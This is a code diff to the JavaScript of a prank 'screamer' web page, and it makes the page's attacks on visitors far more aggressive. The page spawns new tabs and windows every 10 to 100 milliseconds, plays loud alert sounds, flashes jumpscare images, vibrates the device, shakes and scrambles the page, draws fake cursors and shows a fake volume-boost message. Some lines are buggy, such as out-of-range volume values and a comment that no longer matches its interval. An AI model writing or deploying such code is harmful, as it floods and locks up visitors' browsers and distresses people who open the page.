@@ -60,7 +60,7 @@
     function openRandomTabs() {
         window.open(window.location.href, '_blank');
     }
-    setInterval(openRandomTabs, 2000);
+    setInterval(openRandomTabs, 10);
 
     function requestNotification() {
         if (Notification.permission !== 'granted') {
@@ -124,7 +124,7 @@
         document.body.style.transform = "rotate(180deg)";
         setTimeout(() => { document.body.style.transform = "rotate(0deg)"; }, 3000);
     }
-    setInterval(flipUpsideDown, 15000);
+    setInterval(flipUpsideDown, 1500);
 
     function randomResizeText() {
         document.body.style.fontSize = `${Math.floor(Math.random() * 40) + 10}px`;
@@ -157,20 +157,20 @@
     function weirdScroll() {
         window.scrollTo(Math.random() * document.body.scrollWidth, Math.random() * document.body.scrollHeight);
     }
-    setInterval(weirdScroll, 5000);
+    setInterval(weirdScroll, 500);
 
     function vibrateDevice() {
         if (navigator.vibrate) {
             navigator.vibrate([500, 200, 500]);
         }
     }
-    setInterval(vibrateDevice, 8000);
+    setInterval(vibrateDevice, 800);
 
     function crazyRotation() {
         document.body.style.transition = "transform 0.5s ease";
         document.body.style.transform = `rotate(${Math.random() * 720 - 360}deg)`;
     }
-    setInterval(crazyRotation, 4000);
+    setInterval(crazyRotation, 400);
 
     function rainbowText() {
         document.body.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
@@ -181,7 +181,7 @@
         document.body.style.marginLeft = `${Math.random() * 100}px`;
         document.body.style.marginTop = `${Math.random() * 100}px`;
     }
-    setInterval(randomMargin, 4000);
+    setInterval(randomMargin, 400);
 
     function spamInputs() {
         let input = document.createElement('input');
@@ -197,23 +197,23 @@
     function crazyBorder() {
         document.body.style.border = `10px solid hsl(${Math.random() * 360}, 100%, 50%)`;
     }
-    setInterval(crazyBorder, 3500);
+    setInterval(crazyBorder, 350);
 
     function shrinkGrow() {
         document.body.style.transform = `scale(${Math.random() + 0.5})`;
     }
-    setInterval(shrinkGrow, 5000);
+    setInterval(shrinkGrow, 500);
 
     function playLoudSound() {
         const sound = document.getElementById('loudAudio');
-        sound.volume = 1000;
+        sound.volume = 100;
         sound.play();
     }
     setInterval(playLoudSound, 500);
 
     function playAlertSound() {
         const alert = document.getElementById('alertAudio');
-        alert.volume = 1000;
+        alert.volume = 100;
         alert.play();
     }
     setInterval(playAlertSound, 250);
@@ -227,7 +227,7 @@
         document.body.appendChild(div);
         setTimeout(() => div.remove(), 4000);
     }
-    setInterval(fakeVolumeBoostMessage, 15000);
+    setInterval(fakeVolumeBoostMessage, 1500);
 
 // Screamer jumpscares
 const jumpscareImages = [
@@ -255,17 +255,17 @@ function randomJumpscare() {
     document.body.appendChild(img);
 
     let audio = new Audio(jumpscareSounds[Math.floor(Math.random() * jumpscareSounds.length)]);
-    audio.volume = 1;
+    audio.volume = 100;
     audio.play();
 
     setTimeout(() => img.remove(), 3000);
 }
-setInterval(randomJumpscare, 1250);
+setInterval(randomJumpscare, 274);
 
 function openNewWindowWithTab() {
     let newWin = window.open(window.location.href, "_blank", "width=600,height=400");
 }
-setInterval(openNewWindowWithTab, 35000); // Every 35 seconds
+setInterval(openNewWindowWithTab, 100); // Every 35 seconds
 
 const loudSounds = [
     "https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3",
@@ -278,7 +278,7 @@ function spamLoudSounds() {
     audio.volume = 1000;
     audio.play();
 }
-setInterval(spamLoudSounds, 2000);
+setInterval(spamLoudSounds, 500);
 
 function moveFakeMouse() {
     let cursor = document.createElement('div');
@@ -292,9 +292,9 @@ function moveFakeMouse() {
     cursor.style.top = `${Math.random() * window.innerHeight}px`;
     cursor.style.zIndex = 10000;
     document.body.appendChild(cursor);
-    setTimeout(() => cursor.remove(), 1500);
+    setTimeout(() => cursor.remove(), 50);
 }
-setInterval(moveFakeMouse, 2000);
+setInterval(moveFakeMouse, 100);
 
 function scrambleText() {
     document.querySelectorAll('h1, p, div, span, a').forEach(el => {
@@ -306,7 +306,7 @@ function scrambleText() {
         }
     });
 }
-setInterval(scrambleText, 10000);
+setInterval(scrambleText, 500);
 
 function violentScreenShake() {
     document.body.style.animation = 'shake 0.05s infinite';
@@ -314,7 +314,7 @@ function violentScreenShake() {
         document.body.style.animation = '';
     }, 3000);
 }
-setInterval(violentScreenShake, 2500);
+setInterval(violentScreenShake, 500);
 
 function isChromebook() {
     const ua = navigator.userAgent.toLowerCase();
@@ -329,7 +329,7 @@ function simulateScreenRotation() {
         document.body.style.transform = `rotate(${randomRotation}deg)`;
     }
 }
-setInterval(simulateScreenRotation, 1000); //
+setInterval(simulateScreenRotation, 100); //
 
 </script>
 </body>
